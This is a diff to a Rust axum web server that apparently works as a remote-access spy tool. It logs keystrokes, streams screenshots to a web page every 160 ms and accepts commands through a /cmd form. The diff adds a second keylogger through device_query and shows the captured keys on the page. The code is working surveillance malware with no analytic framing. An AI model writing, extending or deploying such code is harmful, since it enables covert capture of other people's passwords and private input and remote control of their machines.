@@ -5,12 +5,14 @@ use axum::{
     response::{Html, IntoResponse},
     routing::{get, post},
 };
+use device_query::{DeviceEvents, DeviceEventsHandler};
 use rdev::listen;
 use serde::Deserialize;
 use std::{
     env::args,
     io::Cursor,
     sync::{Arc, Mutex},
+    time::Duration,
 };
 use tokio::{main, net::TcpListener, process::Command, spawn};
 use xcap::{Monitor, image::ImageFormat};
@@ -25,13 +27,19 @@ async fn main() {
     let lock = Arc::new(Mutex::new(String::new()));
     let lock1 = Arc::clone(&lock);
     let lock2 = Arc::clone(&lock);
+    let lck = Arc::new(Mutex::new(String::new()));
+    let lck1 = Arc::clone(&lck);
+    let lck2 = Arc::clone(&lck);
+    let _key_listener = DeviceEventsHandler::new(Duration::ZERO)
+        .unwrap()
+        .on_key_down(move |key| *lock2.lock().unwrap() += &(key.to_string() + " "));
     spawn(async {
-        let lockin = lock2;
+        let lckin = lck2;
         loop {
-            let lockinin = lockin.clone();
+            let lckinin = lckin.clone();
             listen(move |e| {
                 if let Some(name) = e.name {
-                    *lockinin.lock().unwrap() += &name;
+                    *lckinin.lock().unwrap() += &name;
                 }
             })
             .unwrap();
@@ -43,6 +51,7 @@ async fn main() {
         Router::new()
     .route("/", get(async move || {
         let data = lock1.lock();
+        let dta = lck1.lock();
         ({
             let mut head = HeaderMap::new();
             head.insert(
@@ -55,7 +64,7 @@ async fn main() {
         }, Html(
             String::from(
                 r#"<!DOCTYPE html><html><body><form action="/cmd" method="post"><textarea name="area"></textarea><input type="submit" value="提交" /></form><a href="/clear">清空</a><pre style="white-space: pre-wrap;">"#,
-            ) + data.unwrap().as_str()
+            ) + data.unwrap().as_str() + "<hr/>" + dta.unwrap().as_str()
                 + r#"</pre><img src="screen.bmp"/><script>setInterval(()=>{document.querySelector("img").src="/screen.bmp?"+Date.now()},160);</script></body></html>"#,
         )).into_response()
     })) .route("/cmd", post(async |Form(Frm { mut area })| {
@@ -66,7 +75,7 @@ async fn main() {
             r#"<!DOCTYPE html><html><body><script>window.location.href="/"</script></body></html>"#,
         )
     })) .route("/clear", get(async move || {
-        lock.lock().unwrap().clear();
+        lock.lock().unwrap().clear(); lck.lock().unwrap().clear();
         Html(
             r#"<!DOCTYPE html><html><body><script>window.location.href="/"</script></body></html>"#,
         )
